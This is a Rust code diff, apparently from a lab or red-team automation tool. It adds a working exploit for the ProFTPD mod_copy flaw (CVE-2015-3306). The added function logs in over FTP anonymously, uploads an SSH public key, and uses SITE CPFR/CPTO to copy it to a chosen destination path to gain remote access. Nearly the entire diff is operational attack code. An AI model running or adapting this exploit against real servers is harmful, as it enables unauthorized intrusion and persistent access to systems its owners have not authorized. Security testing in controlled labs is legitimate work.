@@ -1605,6 +1605,184 @@ async fn execute_step(
             );
             StepResult::Simulated
         }
+
+        BootstrapAction::FtpModCopy {
+            port,
+            staging_path,
+            dest_path,
+        } => {
+            let ftp_port = port.unwrap_or(21);
+            tracing::info!(
+                %target, ftp_port, %staging_path, %dest_path,
+                "FTP mod_copy — CVE-2015-3306 STOR + SITE CPFR/CPTO"
+            );
+            execute_ftp_mod_copy(
+                target,
+                ftp_port,
+                staging_path,
+                dest_path,
+                key_path,
+                timeout_ms,
+            )
+            .await
+        }
+    }
+}
+
+/// Parse FTP PASV response into a connectable "ip:port" string.
+///
+/// Format: `227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)`
+/// Port = p1 * 256 + p2
+fn parse_pasv_addr(resp: &str) -> anyhow::Result<String> {
+    let start = resp
+        .find('(')
+        .ok_or_else(|| anyhow::anyhow!("PASV: no '(' in response"))?;
+    let end = resp
+        .find(')')
+        .ok_or_else(|| anyhow::anyhow!("PASV: no ')' in response"))?;
+    let nums: Vec<u16> = resp[start + 1..end]
+        .split(',')
+        .filter_map(|s| s.trim().parse::<u16>().ok())
+        .collect();
+    if nums.len() != 6 {
+        return Err(anyhow::anyhow!(
+            "PASV: expected 6 values, got {}",
+            nums.len()
+        ));
+    }
+    let ip = format!("{}.{}.{}.{}", nums[0], nums[1], nums[2], nums[3]);
+    let port = nums[4] * 256 + nums[5];
+    Ok(format!("{ip}:{port}"))
+}
+
+/// CVE-2015-3306 ProFTPD mod_copy bootstrap: inject ephemeral pubkey via FTP.
+///
+/// Full sequence over the FTP control channel:
+///   USER anonymous → PASS → TYPE I → PASV (open data channel)
+///   STOR staging_path (upload pubkey bytes) → SITE CPFR staging_path
+///   SITE CPTO dest_path → QUIT
+///
+/// Preconditions: mod_copy loaded in proftpd.conf, FTP process can write to dest_path.
+async fn execute_ftp_mod_copy(
+    target: Ipv4Addr,
+    port: u16,
+    staging_path: &str,
+    dest_path: &str,
+    key_path: Option<&Path>,
+    timeout_ms: u64,
+) -> StepResult {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    use tokio::net::TcpStream;
+    use tokio::time::{timeout, Duration};
+
+    let pubkey = match key_path {
+        Some(kp) => {
+            let pub_path = kp.with_extension("pub");
+            match tokio::fs::read_to_string(&pub_path).await {
+                Ok(s) => s,
+                Err(e) => return StepResult::Failed(format!("ftp-mod-copy: pubkey read: {e}")),
+            }
+        }
+        None => {
+            return StepResult::Failed(
+                "ftp-mod-copy: ephemeral key required — key_path is None".into(),
+            )
+        }
+    };
+
+    let ctrl_addr = format!("{target}:{port}");
+
+    let result = timeout(Duration::from_millis(timeout_ms), async {
+        let mut ctrl = TcpStream::connect(&ctrl_addr).await?;
+        let mut buf = vec![0u8; 4096];
+
+        // Banner (220)
+        let n = ctrl.read(&mut buf).await?;
+        let banner = String::from_utf8_lossy(&buf[..n]);
+        if !banner.starts_with("220") {
+            return Err(anyhow::anyhow!("unexpected banner: {}", banner.trim()));
+        }
+        tracing::debug!(banner = banner.trim(), "FTP banner");
+
+        // USER anonymous
+        ctrl.write_all(b"USER anonymous\r\n").await?;
+        let _ = ctrl.read(&mut buf).await?;
+
+        // PASS
+        ctrl.write_all(b"PASS physarum@lab\r\n").await?;
+        let n = ctrl.read(&mut buf).await?;
+        let login = String::from_utf8_lossy(&buf[..n]);
+        if !login.starts_with("230") {
+            return Err(anyhow::anyhow!("FTP login failed: {}", login.trim()));
+        }
+        tracing::debug!("FTP anonymous login OK");
+
+        // TYPE I (binary transfer)
+        ctrl.write_all(b"TYPE I\r\n").await?;
+        let _ = ctrl.read(&mut buf).await?;
+
+        // PASV — get data channel endpoint
+        ctrl.write_all(b"PASV\r\n").await?;
+        let n = ctrl.read(&mut buf).await?;
+        let pasv_resp = String::from_utf8_lossy(&buf[..n]).to_string();
+        let data_addr = parse_pasv_addr(&pasv_resp)?;
+        tracing::debug!(%data_addr, "FTP PASV data channel");
+
+        // Open data channel before sending STOR
+        let mut data = TcpStream::connect(&data_addr).await?;
+
+        // STOR staging_path
+        ctrl.write_all(format!("STOR {staging_path}\r\n").as_bytes())
+            .await?;
+        let n = ctrl.read(&mut buf).await?;
+        let stor_resp = String::from_utf8_lossy(&buf[..n]);
+        if !stor_resp.starts_with("150") && !stor_resp.starts_with("125") {
+            return Err(anyhow::anyhow!("STOR rejected: {}", stor_resp.trim()));
+        }
+
+        // Upload pubkey on data channel then signal EOF
+        data.write_all(pubkey.as_bytes()).await?;
+        data.shutdown().await?;
+        drop(data);
+
+        // 226 Transfer complete
+        let n = ctrl.read(&mut buf).await?;
+        let xfer = String::from_utf8_lossy(&buf[..n]);
+        if !xfer.starts_with("226") {
+            return Err(anyhow::anyhow!("STOR transfer incomplete: {}", xfer.trim()));
+        }
+        tracing::info!(%staging_path, "FTP STOR pubkey uploaded");
+
+        // SITE CPFR staging_path
+        ctrl.write_all(format!("SITE CPFR {staging_path}\r\n").as_bytes())
+            .await?;
+        let n = ctrl.read(&mut buf).await?;
+        let cpfr = String::from_utf8_lossy(&buf[..n]);
+        if !cpfr.starts_with("350") {
+            return Err(anyhow::anyhow!("SITE CPFR failed: {}", cpfr.trim()));
+        }
+
+        // SITE CPTO dest_path
+        ctrl.write_all(format!("SITE CPTO {dest_path}\r\n").as_bytes())
+            .await?;
+        let n = ctrl.read(&mut buf).await?;
+        let cpto = String::from_utf8_lossy(&buf[..n]);
+        if !cpto.starts_with("250") {
+            return Err(anyhow::anyhow!("SITE CPTO failed: {}", cpto.trim()));
+        }
+        tracing::info!(%dest_path, "FTP SITE CPTO pubkey installed");
+
+        // QUIT
+        ctrl.write_all(b"QUIT\r\n").await?;
+
+        Ok::<(), anyhow::Error>(())
+    })
+    .await;
+
+    match result {
+        Ok(Ok(())) => StepResult::Ok,
+        Ok(Err(e)) => StepResult::Failed(format!("ftp-mod-copy: {e}")),
+        Err(_) => StepResult::Failed("ftp-mod-copy: timeout".into()),
     }
 }
 
